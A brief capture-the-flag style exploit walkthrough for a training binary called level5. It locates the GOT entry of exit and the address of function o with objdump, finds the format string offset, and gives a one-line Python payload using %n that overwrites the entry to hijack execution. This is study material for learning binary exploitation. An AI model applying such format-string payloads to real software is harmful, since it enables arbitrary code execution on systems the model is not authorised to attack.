```shell
objdump -R ./level5 | grep exit
08049838 R_386_JUMP_SLOT   exit

objdump -t ./level5 | grep o
080484a4 g     F .text	0000001e              o

./level5
AAAA %x %x %x %x
AAAA 200 b7fd1ac0 b7ff37d0 41414141

(python -c print'"\x38\x98\x04\x08" + "%134513828x%4$n"'; cat -) | ./level5
```
Here we want to modify to address of `exit` with the address of `o`.
